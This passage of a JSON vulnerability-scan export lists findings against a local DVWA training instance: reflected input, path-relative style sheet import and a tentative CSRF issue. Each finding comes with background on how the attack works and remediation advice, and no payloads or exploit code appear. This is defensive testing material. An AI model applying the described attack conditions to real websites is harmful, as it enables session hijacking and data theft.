        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "84": {
        "\ufeffissue__serialNumber": "4.38728E+18",
        "issue__type": "4197376",
        "issue__name": "Input returned in response (reflected)",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/view_help.php",
        "issue__location": "/dvwa/vulnerabilities/view_help.php [id parameter]",
        "issue__severity": "Information",
        "issue__confidence": "Certain",
        "issue__issueBackground": "<p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p>",
        "issue__remediationBackground": "",
        "issue__references": "",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/20.html\">CWE-20: Improper Input Validation</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/116.html\">CWE-116: Improper Encoding or Escaping of Output</a></li>\\n</ul>",
        "issue__issueDetail": "The value of the <b>id</b> request parameter is copied into the application's response.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "85": {
        "\ufeffissue__serialNumber": "7.00828E+18",
        "issue__type": "2097960",
        "issue__name": "Path-relative style sheet import",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/",
        "issue__location": "/dvwa/",
        "issue__severity": "Information",
        "issue__confidence": "Firm",
        "issue__issueBackground": "<p>Path-relative style sheet import vulnerabilities arise when the following conditions hold:</p>\\n<ol>\\n<li>A response contains a style sheet import that uses a path-relative URL (for example, the page at \"/original-path/file.php\" might import \"styles/main.css\").</li><li>When handling requests, the application or platform tolerates superfluous path-like data following the original filename in the URL (for example, \"/original-path/file.php/extra-junk/\"). When superfluous data is added to the original URL, the application's response still contains a path-relative stylesheet import.</li><li>The response in condition 2 can be made to render in a browser's quirks mode, either because it has a missing or old doctype directive, or because it allows itself to be framed by a page under an attacker's control.</li>\\n<li>When a browser requests the style sheet that is imported in the response from the modified URL (using the URL \"/original-path/file.php/extra-junk/styles/main.css\"), the application returns something other than the CSS response that was supposed to be imported. Given the behavior described in condition 2, this will typically be the same response that was originally returned in condition 1.</li><li>An attacker has a means of manipulating some text within the response in condition 4, for example because the application stores and displays some past input, or echoes some text within the current URL.</li></ol>\\n<p>Given the above conditions, an attacker can execute CSS injection within the browser of the target user. The attacker can construct a URL that causes the victim's browser to import as CSS a different URL than normal, containing text that the attacker can manipulate.</p>\\n<p>Being able to inject arbitrary CSS into the victim's browser may enable various attacks, including:</p>\\n<ul>\\n  <li>Executing arbitrary JavaScript using IE's expression() function.</li><li>Using CSS selectors to read parts of the HTML source, which may include sensitive data such as anti-CSRF tokens.</li>\\n<li>Capturing any sensitive data within the URL query string by making a further style sheet import to a URL on the attacker's domain, and monitoring the incoming Referer header.</li></ul>",
        "issue__remediationBackground": "<p>The root cause of the vulnerability can be resolved by not using path-relative URLs in style sheet imports. Aside from this, attacks can also be prevented by implementing all of the following defensive measures: </p>\\n<ul><li>Setting the HTTP response header \"X-Frame-Options: deny\" in all responses. One method that an attacker can use to make a page render in quirks mode is to frame it within their own page that is rendered in quirks mode. Setting this header prevents the page from being framed.</li><li>Setting a modern doctype (e.g. \"&lt;!doctype html&gt;\") in all HTML responses. This prevents the page from being rendered in quirks mode (unless it is being framed, as described above).</li>\\n<li>Setting the HTTP response header \"X-Content-Type-Options: nosniff\" in all responses. This prevents the browser from processing a non-CSS response as CSS, even if another page loads the response via a style sheet import.</li></ul>",
        "issue__references": "<ul><li><a href=\"https://portswigger.net/research/detecting-and-exploiting-path-relative-stylesheet-import-prssi-vulnerabilities\">Detecting and exploiting path-relative stylesheet import (PRSSI) vulnerabilities</a></li></ul>",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/16.html\">CWE-16: Configuration</a></li>\\n  <li><a href=\"https://capec.mitre.org/data/definitions/154.html\">CAPEC-154: Resource Location Spoofing</a></li>\\n  <li><a href=\"https://capec.mitre.org/data/definitions/468.html\">CAPEC-468: Generic Cross-Browser Cross-Domain Theft</a></li>\\n</ul>",
        "issue__issueDetail": "The application may be vulnerable to path-relative style sheet import (PRSSI) attacks. The first four conditions for an exploitable vulnerability are present (see issue background):<ol><li>The original response contains a path-relative style sheet import (see response 1).</li><li>When superfluous path-like data is placed into the URL following the original filename (see request 2), the application's response still contains a path-relative style sheet import (see response 2).</li><li>Response 2 can be made to render in a browser's quirks mode. Although the page contains a modern doctype directive, the response does not prevent itself from being framed. An attacker can frame the response within a page that they control, to force it to be rendered in quirks mode. (Note that this technique is IE-specific and due to P3P restrictions might sometimes limit the impact of a successful attack.)</li><li>When the path-relative style sheet import in response 2 is requested (see request 3) the application returns something other than the CSS response that was supposed to be imported (see response 3).</li></ol>It was not verified whether condition 5 holds (see issue background), and you should manually investigate whether it is possible to manipulate some text within response 3, to enable full exploitation of this issue.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "86": {
        "\ufeffissue__serialNumber": "2.90917E+18",
        "issue__type": "4197376",
        "issue__name": "Input returned in response (reflected)",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/phpinfo.php",
        "issue__location": "/dvwa/phpinfo.php [name of an arbitrarily supplied URL parameter]",
        "issue__severity": "Information",
        "issue__confidence": "Certain",
        "issue__issueBackground": "<p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p>",
        "issue__remediationBackground": "",
        "issue__references": "",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/20.html\">CWE-20: Improper Input Validation</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/116.html\">CWE-116: Improper Encoding or Escaping of Output</a></li>\\n</ul>",
        "issue__issueDetail": "The name of an arbitrarily supplied URL parameter is copied into the application's response.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "87": {
        "\ufeffissue__serialNumber": "5.92884E+18",
        "issue__type": "2097960",
        "issue__name": "Path-relative style sheet import",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/weak_id/",
        "issue__location": "/dvwa/vulnerabilities/weak_id/",
        "issue__severity": "Information",
        "issue__confidence": "Firm",
        "issue__issueBackground": "<p>Path-relative style sheet import vulnerabilities arise when the following conditions hold:</p>\\n<ol>\\n<li>A response contains a style sheet import that uses a path-relative URL (for example, the page at \"/original-path/file.php\" might import \"styles/main.css\").</li><li>When handling requests, the application or platform tolerates superfluous path-like data following the original filename in the URL (for example, \"/original-path/file.php/extra-junk/\"). When superfluous data is added to the original URL, the application's response still contains a path-relative stylesheet import.</li><li>The response in condition 2 can be made to render in a browser's quirks mode, either because it has a missing or old doctype directive, or because it allows itself to be framed by a page under an attacker's control.</li>\\n<li>When a browser requests the style sheet that is imported in the response from the modified URL (using the URL \"/original-path/file.php/extra-junk/styles/main.css\"), the application returns something other than the CSS response that was supposed to be imported. Given the behavior described in condition 2, this will typically be the same response that was originally returned in condition 1.</li><li>An attacker has a means of manipulating some text within the response in condition 4, for example because the application stores and displays some past input, or echoes some text within the current URL.</li></ol>\\n<p>Given the above conditions, an attacker can execute CSS injection within the browser of the target user. The attacker can construct a URL that causes the victim's browser to import as CSS a different URL than normal, containing text that the attacker can manipulate.</p>\\n<p>Being able to inject arbitrary CSS into the victim's browser may enable various attacks, including:</p>\\n<ul>\\n  <li>Executing arbitrary JavaScript using IE's expression() function.</li><li>Using CSS selectors to read parts of the HTML source, which may include sensitive data such as anti-CSRF tokens.</li>\\n<li>Capturing any sensitive data within the URL query string by making a further style sheet import to a URL on the attacker's domain, and monitoring the incoming Referer header.</li></ul>",
        "issue__remediationBackground": "<p>The root cause of the vulnerability can be resolved by not using path-relative URLs in style sheet imports. Aside from this, attacks can also be prevented by implementing all of the following defensive measures: </p>\\n<ul><li>Setting the HTTP response header \"X-Frame-Options: deny\" in all responses. One method that an attacker can use to make a page render in quirks mode is to frame it within their own page that is rendered in quirks mode. Setting this header prevents the page from being framed.</li><li>Setting a modern doctype (e.g. \"&lt;!doctype html&gt;\") in all HTML responses. This prevents the page from being rendered in quirks mode (unless it is being framed, as described above).</li>\\n<li>Setting the HTTP response header \"X-Content-Type-Options: nosniff\" in all responses. This prevents the browser from processing a non-CSS response as CSS, even if another page loads the response via a style sheet import.</li></ul>",
        "issue__references": "<ul><li><a href=\"https://portswigger.net/research/detecting-and-exploiting-path-relative-stylesheet-import-prssi-vulnerabilities\">Detecting and exploiting path-relative stylesheet import (PRSSI) vulnerabilities</a></li></ul>",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/16.html\">CWE-16: Configuration</a></li>\\n  <li><a href=\"https://capec.mitre.org/data/definitions/154.html\">CAPEC-154: Resource Location Spoofing</a></li>\\n  <li><a href=\"https://capec.mitre.org/data/definitions/468.html\">CAPEC-468: Generic Cross-Browser Cross-Domain Theft</a></li>\\n</ul>",
        "issue__issueDetail": "The application may be vulnerable to path-relative style sheet import (PRSSI) attacks. The first four conditions for an exploitable vulnerability are present (see issue background):<ol><li>The original response contains a path-relative style sheet import (see response 1).</li><li>When superfluous path-like data is placed into the URL following the original filename (see request 2), the application's response still contains a path-relative style sheet import (see response 2).</li><li>Response 2 can be made to render in a browser's quirks mode. Although the page contains a modern doctype directive, the response does not prevent itself from being framed. An attacker can frame the response within a page that they control, to force it to be rendered in quirks mode. (Note that this technique is IE-specific and due to P3P restrictions might sometimes limit the impact of a successful attack.)</li><li>When the path-relative style sheet import in response 2 is requested (see request 3) the application returns something other than the CSS response that was supposed to be imported (see response 3).</li></ol>It was not verified whether condition 5 holds (see issue background), and you should manually investigate whether it is possible to manipulate some text within response 3, to enable full exploitation of this issue.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "88": {
        "\ufeffissue__serialNumber": "4.88379E+18",
        "issue__type": "2098944",
        "issue__name": "Cross-site request forgery",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/weak_id/",
        "issue__location": "/dvwa/vulnerabilities/weak_id/",
        "issue__severity": "Medium",
        "issue__confidence": "Tentative",
        "issue__issueBackground": "<p>Cross-site request forgery (CSRF) vulnerabilities may arise when applications rely solely on HTTP cookies to identify the user that has issued a particular request. Because browsers automatically add cookies to requests regardless of their origin, it may be possible for an attacker to create a malicious web site that forges a cross-domain request to the vulnerable application. For a request to be vulnerable to CSRF, the following conditions must hold:</p>\\n<ul>\\n<li>The request can be issued cross-domain, for example using an HTML form. If the request contains non-standard headers or body content, then it may only be issuable from a page that originated on the same domain.</li>\\n<li>The application relies solely on HTTP cookies or Basic Authentication to identify the user that issued the request. If the application places session-related tokens elsewhere within the request, then it may not be vulnerable.</li>\\n<li>The request performs some privileged action within the application, which modifies the application's state based on the identity of the issuing user.</li><li>The attacker can determine all the parameters required to construct a request that performs the action. If the request contains any values that the attacker cannot determine or predict, then it is not vulnerable.</li></ul>",
        "issue__remediationBackground": "<p>The most effective way to protect against CSRF vulnerabilities is to include within relevant requests an additional token that is not transmitted in a cookie: for example, a parameter in a hidden form field. This additional token should contain sufficient entropy, and be generated using a cryptographic random number generator, such that it is not feasible for an attacker to determine or predict the value of any token that was issued to another user. The token should be associated with the user's session, and the application should validate that the correct token is received before performing any action resulting from the request.</p>\\n<p>An alternative approach, which may be easier to implement, is to validate that Host and Referer headers in relevant requests are both present and contain the same domain name. However, this approach is somewhat less robust: historically, quirks in browsers and plugins have often enabled attackers to forge cross-domain requests that manipulate these headers to bypass such defenses. </p>",
        "issue__references": "<ul>\\n    <li><a href=\"https://portswigger.net/web-security/csrf\">Web Security Academy: Cross-site request forgery</a></li>\\n    <li><a href=\"https://support.portswigger.net/customer/portal/articles/1965674-using-burp-to-test-for-cross-site-request-forgery-csrf-\">Using Burp to Test for Cross-Site Request Forgery</a></li>\\n    <li><a href=\"https://media.blackhat.com/eu-13/briefings/Lundeen/bh-eu-13-deputies-still-confused-lundeen-wp.pdf\">The Deputies Are Still Confused</a></li>\\n</ul>",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/352.html\">CWE-352: Cross-Site Request Forgery (CSRF)</a></li>\\n    <li><a href=\"https://capec.mitre.org/data/definitions/62.html\">CAPEC-62: Cross Site Request Forgery</a></li>\\n</ul>",
        "issue__issueDetail": "The request appears to be vulnerable to cross-site request forgery (CSRF) attacks against authenticated users.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "89": {
        "\ufeffissue__serialNumber": "1.65943E+18",
        "issue__type": "2097960",
        "issue__name": "Path-relative style sheet import",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/fi/",
        "issue__location": "/dvwa/vulnerabilities/fi/",
        "issue__severity": "Information",
        "issue__confidence": "Firm",
        "issue__issueBackground": "<p>Path-relative style sheet import vulnerabilities arise when the following conditions hold:</p>\\n<ol>\\n<li>A response contains a style sheet import that uses a path-relative URL (for example, the page at \"/original-path/file.php\" might import \"styles/main.css\").</li><li>When handling requests, the application or platform tolerates superfluous path-like data following the original filename in the URL (for example, \"/original-path/file.php/extra-junk/\"). When superfluous data is added to the original URL, the application's response still contains a path-relative stylesheet import.</li><li>The response in condition 2 can be made to render in a browser's quirks mode, either because it has a missing or old doctype directive, or because it allows itself to be framed by a page under an attacker's control.</li>\\n<li>When a browser requests the style sheet that is imported in the response from the modified URL (using the URL \"/original-path/file.php/extra-junk/styles/main.css\"), the application returns something other than the CSS response that was supposed to be imported. Given the behavior described in condition 2, this will typically be the same response that was originally returned in condition 1.</li><li>An attacker has a means of manipulating some text within the response in condition 4, for example because the application stores and displays some past input, or echoes some text within the current URL.</li></ol>\\n<p>Given the above conditions, an attacker can execute CSS injection within the browser of the target user. The attacker can construct a URL that causes the victim's browser to import as CSS a different URL than normal, containing text that the attacker can manipulate.</p>\\n<p>Being able to inject arbitrary CSS into the victim's browser may enable various attacks, including:</p>\\n<ul>\\n  <li>Executing arbitrary JavaScript using IE's expression() function.</li><li>Using CSS selectors to read parts of the HTML source, which may include sensitive data such as anti-CSRF tokens.</li>\\n<li>Capturing any sensitive data within the URL query string by making a further style sheet import to a URL on the attacker's domain, and monitoring the incoming Referer header.</li></ul>",
        "issue__remediationBackground": "<p>The root cause of the vulnerability can be resolved by not using path-relative URLs in style sheet imports. Aside from this, attacks can also be prevented by implementing all of the following defensive measures: </p>\\n<ul><li>Setting the HTTP response header \"X-Frame-Options: deny\" in all responses. One method that an attacker can use to make a page render in quirks mode is to frame it within their own page that is rendered in quirks mode. Setting this header prevents the page from being framed.</li><li>Setting a modern doctype (e.g. \"&lt;!doctype html&gt;\") in all HTML responses. This prevents the page from being rendered in quirks mode (unless it is being framed, as described above).</li>\\n<li>Setting the HTTP response header \"X-Content-Type-Options: nosniff\" in all responses. This prevents the browser from processing a non-CSS response as CSS, even if another page loads the response via a style sheet import.</li></ul>",
        "issue__references": "<ul><li><a href=\"https://portswigger.net/research/detecting-and-exploiting-path-relative-stylesheet-import-prssi-vulnerabilities\">Detecting and exploiting path-relative stylesheet import (PRSSI) vulnerabilities</a></li></ul>",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/16.html\">CWE-16: Configuration</a></li>\\n  <li><a href=\"https://capec.mitre.org/data/definitions/154.html\">CAPEC-154: Resource Location Spoofing</a></li>\\n  <li><a href=\"https://capec.mitre.org/data/definitions/468.html\">CAPEC-468: Generic Cross-Browser Cross-Domain Theft</a></li>\\n</ul>",
        "issue__issueDetail": "The application may be vulnerable to path-relative style sheet import (PRSSI) attacks. The first four conditions for an exploitable vulnerability are present (see issue background):<ol><li>The original response contains a path-relative style sheet import (see response 1).</li><li>When superfluous path-like data is placed into the URL following the original filename (see request 2), the application's response still contains a path-relative style sheet import (see response 2).</li><li>Response 2 can be made to render in a browser's quirks mode. Although the page contains a modern doctype directive, the response does not prevent itself from being framed. An attacker can frame the response within a page that they control, to force it to be rendered in quirks mode. (Note that this technique is IE-specific and due to P3P restrictions might sometimes limit the impact of a successful attack.)</li><li>When the path-relative style sheet import in response 2 is requested (see request 3) the application returns something other than the CSS response that was supposed to be imported (see response 3).</li></ol>It was not verified whether condition 5 holds (see issue background), and you should manually investigate whether it is possible to manipulate some text within response 3, to enable full exploitation of this issue.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
